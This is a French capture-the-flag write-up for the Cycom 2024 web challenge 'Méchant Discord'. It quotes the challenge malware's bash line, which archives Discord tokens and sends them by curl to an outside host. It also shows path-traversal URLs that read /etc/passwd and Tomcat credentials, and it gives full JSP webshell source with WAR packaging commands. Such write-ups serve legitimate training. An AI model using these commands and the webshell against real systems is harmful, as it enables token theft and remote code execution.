---
title: "Méchant Discord"
date: 2024-04-14T09:03:20-08:00
draft: false
---

# Cycom 2024 - Mechant Discord - Web - 300 points

## Énoncé
Bien, il semble que t'as mis la main sur le "malware". Sers-toi en pour remonter jusqu'a l'attaquant et lui montrer qui c'est le patron.

*Le flag se trouve à la racine du filesystem. Vous aurez besoin d'une RCE pour le trouver.*

## Solution
Une fois le malware téléchargé, on l'ouvre, et on observe que c'est juste un script bash qui fait trois choses :
- Créer une archive du fichier qui contient les tokens Discord
- Encodage de l'archive sous la forme de `base64`
- Envoi de l'archive encodée dans une requête HTTP à un serveur externe
  
```bash
tar -cf /tmp/ax_ruDFqi '~/.config/discord/Local Storage/leveldb'
curl "http://mal.challengecyber.fr/89g2GgtKsrIdkuHK/new.jsp?b64=${base64 -w0 /tmp/ax_ruDFqi}"
```

L'URL contactée lors de l'envoi de l'archive vers l'attaquant est sur le même domaine que le script initial, mais avec un chemin comprenant une chaîne de texte aléatoire.

La page appellée est `new.jsp`, et semble uniquement faite pour l'injestion des fichiers envoyés. Lorsqu'on contacte la page avec un navigateur, on est accueilli par un fantastique message.

![](/images/2024/011/01.png)

Lorsqu'on tente d'accéder à la racine de l'application, on tombe sur une interface haute en couleurs pour la récupération des fichiers envoyés par les victimes.

![](/images/2024/011/02.png)

De plus, lorsqu'on remonte à la racine du site, on constate que la page d'accueil de `Tomcat` est présente, ainsi que l'accès au manager, qui demande un nom d'utilisateur et un mot de passe. Le manager est probalement notre vecteur de RCE.

![](/images/2024/011/03.png)

En revenant sur la page du stealer, on constate que chaque lien vers un fichier pointe vers un nouvel endpoint : `file.jsp`, qui est appelé avec un paramètre `file`, qui correspond au nom du fichier à télécharger. ``

![](/images/2024/011/04.png)

Ce paramètre `file` n'est pas correctement vérifié par le serveur et permet une lecture de fichiers arbitraire. En insérant les caractères `../`, il est possible de remonter dans l'arborescence du système de fichiers.

Il est donc possible de charger, par exemple, le fichier `/etc/passwd`.

```
https://mal.challengecyber.fr/89g2GgtKsrIdkuHK/file.jsp?file=../../../../../../../etc/passwd
```

![](/images/2024/011/05.png)

A partir de cet endpoint, on peut obtenir le fichier `tomcat-users.xml`, qui contient les identifiants de connexion au manager de tomcat.

Le fichier se situe à l'emplacement standard `/usr/local/tomcat/conf/tomcat-users.xml`.

```
https://mal.challengecyber.fr/89g2GgtKsrIdkuHK/file.jsp?file=../../../../../../../usr/local/tomcat/conf/tomcat-users.xml
```

![](/images/2024/011/06.png)

On obtient les identifiants `root:XCsZYM3cfNGm`, et on peut maintenant se connecter au manager de tomcat.

![](/images/2024/011/07.png)

Il ne reste plus qu'a utiliser le manager pour déployer un reverse shell ou un webshell sur la machine, et obtenir le flag !

Par exemple : 

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

```bash
mkdir DujziKsi7uz
cp index.jsp DujziKsi7uz
cd DujziKsi7uz
jar -cvf ../DujziKsi7uz.war *
```

![](/images/2024/011/08.png)

Une fois le `.war` uploadé, on se rend à la racine du disque et on affiche le flag.

![](/images/2024/011/09.png)


![](/images/2024/011/10.png)

*Flag: CYCOM{t0m\*\*\*\*\*\*\*}*

## Auteur

Lyne